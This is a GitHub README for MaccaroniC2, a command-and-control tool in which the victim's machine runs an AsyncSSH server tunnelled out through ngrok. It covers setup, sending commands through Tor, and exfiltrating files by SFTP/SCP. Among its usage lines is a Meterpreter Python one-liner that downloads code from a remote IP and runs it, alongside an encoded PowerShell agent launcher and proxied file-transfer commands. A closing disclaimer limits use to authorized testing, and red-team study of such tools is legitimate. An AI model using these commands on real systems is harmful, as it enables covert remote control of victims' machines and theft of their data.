# MaccaroniC2 - Empowering Command & Control using AsyncSSH

![](https://github.com/CalfCrusher/MaccaroniC2/blob/main/maccaroni.jpg)

**MaccaroniC2** is a *proof-of-concept* **Command and Control framework** that utilizes the powerful `AsyncSSH` Python library which provides an asynchronous client and server implementation of the SSHv2 protocol and use `PyNgrok` wrapper for `ngrok` integration. This tool is inspired for a specific scenario where the victim runs the AsyncSSH server and establishes a tunnel to the outside, ready to receive commands by the attacker.

The attacker leverages the `Ngrok official API` to retrieve the hostname and port of the tunnel to establish a connection. This approach takes advantage of the comprehensive capabilities provided by **AsyncSSH**, including its integrated support for `SFTP` and `SCP`, facilitating secure and efficient file exfiltration and more.

Moreover, the attacker can send and execute system commands using a SOCKS proxy, leveraging the benefits offered, for example, using `TOR` to enhance anonymity.

* *Ngrok free account only allows the usage of one tunnel at a time. With some changes this tool could be perfect for a BOT-like C&C framework to control multiple SSH instances, but you would need to upgrade your plan on the Ngrok website, see https://ngrok.com/pricing*
   
## Setup and Procedure

1) Run `python3 gen_rsa.py` to generate a pair of SSH keys. The newly generated `id_rsa` is used by the attacker to connect to the server running on the victim's machine.

2) Edit the `asyncssh_server.py` file and place the contents of the newly generated `id_rsa.pub` inside the `pub_key` variable. The `asyncssh_server.py` provide an implementation of the SSHv2 with SFTP and SCP features. This is the script run by the victim.

3) Create a free account on Ngrok site and take note of the `AUTH` Token.
  
4) Add the `AUTH` token to the `token` variable in `asyncssh_server.py`, this needs to be harcoded inside the `ngrok_tunnel()` function.
  
5) Create a free `API` key on the Ngrok website. Take note of the generated string.

6) Put the `API` key string in the `api_key` variable inside the `async_commander.py` file. This allows us to automatically retrieve the Ngrok domain and port of the active tunnel during automation.

7) Perform the same step for `get_endpoints.py` file. This script retrieves various useful information about active tunnels.

## Send commands to server  

With `async_commander.py` you can send any command to the server. It *automatically* requests the Ngrok tunnel's domain and port activated by the victim using Ngrok official API.
  
Please note also that the `id_rsa` needs to be in the same folder of `async_commander.py`

## Basic Usage

Run server on victim machine:

`python3 asyncssh_server.py`

___

From the attacker machine send command using socks proxy:  
  
`python3 asyncssh_commander.py "ls -la" --proxy socks5h://127.0.0.1:9050`
 
___
  
Send command without using a proxy:

`python3 asyncssh_commander.py "whoami"`
  
___
  
Spawn another C2 agent (Powershell-Empire, Meterpreter, etc):

`python3 asyncssh_commander.py "powershell.exe -e ABJe...dhYte"`

Meterpreter Python Payload

`python3 asyncssh_commander.py "python3 -c \"import sys; import ssl; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]], fromlist=('urlopen',)); r=u.urlopen('http://100.100.100.100:8080/YnrVekAsVF', context=ssl._create_unverified_context()); exec(r.read());\""` 

___    
  
Get list of active tunnels:
  
`python3 get_endpoints.py`
  
___
  
Generate new RSA key pairs:
  
`python3 gen_rsa.py`
  
## Advanced Usage
 
Using `SFTP` and `SCP` - you don't need a valid username just the correct `id_rsa`

- With proxy:
  
`proxychains sftp -P NGROK_PORT -i id_rsa ddddd@NGROK_HOST`
  
`scp -i id_rsa -o ProxyCommand="nc -x localhost:9050 %h NGROK_PORT" source_file ddddd@NGROK_HOST:destination_path`
  
___  
  
- No proxy:
  
`sftp -P 18499 -i id_rsa ddddd@0.tcp.ngrok.io`
  
`scp -i id_rsa -P 18499 source_file ddddd@0.tcp.ngrok.io:destination_path`
  
___

**DISCLAIMER: This tool is intended for testing and educational purposes only. It should only be used on systems with proper authorization. Any unauthorized or illegal use of this tool is strictly prohibited. The creator of this tool holds no responsibility for any misuse or damage caused by its usage. Please ensure compliance with applicable laws and regulations while utilizing this tool**
  
